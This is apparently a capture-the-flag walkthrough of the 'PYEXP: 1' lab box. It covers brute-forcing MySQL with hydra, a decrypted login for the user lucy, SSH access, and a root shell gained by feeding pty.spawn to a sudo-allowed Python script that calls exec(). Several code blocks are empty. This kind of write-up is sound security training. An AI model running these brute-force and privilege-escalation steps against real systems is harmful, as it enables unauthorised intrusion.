## Overview

"PYEXP: 1" is an interesting box as it teaches the concept of  brute-forcing,database enumeration and exploiting dangerous python function.

```

From the output we can see that there is a SSH server on port 1337 and a MySQL service at port 3306. 
Honestly, there isn't much to work on so the only option I could think of was to brute-force MySQL for password.

## MYSQL - TCP 3306

Brute-forcing root password: 
```bash
└─# hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.205.118 mysql

```

That took awhile but the result is that we obtain the root password for mysql. Let's enumerate the database for any credentials we can use to access the SSH server!



## Shell as Lucy

Enumerating the database:


```bash

```

After enumerating the database server there isn't much but the above.

As we can see from the above, there is a fernet table with the column name "cred" and "keyy" from the table name fernet.

A quick google about fernet leads me to **"fernet encryption"**
*:Fernet is a symmetric encryption method which makes sure that the message encrypted cannot be manipulated/read without the key.*

When inputting the Token and Key into the site here, [Fernet decryption!](https://asecuritysite.com/encryption/ferdecode)

We get the credentials below:
Decoded: lucy:wJ9`"Lemdv9[FEw-

Great ! Now we have a possible username and password! Let's try to SSH into the server
```bash
└─# ssh lucy@192.168.205.118 -p 1337                                                                                                                                                         
lucy@192.168.205.118's password:

lucy@pyexp:~$ whoami

```

With that we are now in the system running as lucy!

## Shell as Root

One of the first things i like to do is run beside running `linpeas.sh` is to run `sudo -l` to see if the current user is able to run any privilege commands which can be abused.
```bash
lucy@pyexp:/tmp$ sudo -l
Matching Defaults entries for lucy on pyexp:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lucy may run the following commands on pyexp:
    (root) NOPASSWD: /usr/bin/python2 /opt/exp.py
```

Interestingly , we can run `/usr/bin/python2 /opt/exp.py` as root. A further look into the file reveals the below
```bash
lucy@pyexp:/tmp$ cat /opt/exp.py
uinput = raw_input('how are you?')
exec(uinput)

```
From the `exp.py` file above we can see that it takes a user input. But what is dangerous here is that the script uses the vulnerable `exec` function. 


Why is `exec` dangerous ? 
It is because it take strings and turn them into executable code!  A user could build a string so that it runs other Python functions to potentially erase all your data, expose your secret keys, dump your database, or perform other malicious actions. Since we can execute the file as a root user, the command executed will be as root. 


Thus a simple way to become root would be to use the python function to spawn a bash shell!

```bash
lucy@pyexp:/tmp$ sudo -u root /usr/bin/python2 /opt/exp.py
how are you?import pty; pty.spawn("/bin/bash")
root@pyexp:/tmp# whoami
root
root@pyexp:/tmp# id
uid=0(root) gid=0(root) groups=0(root)

```

And we are root!
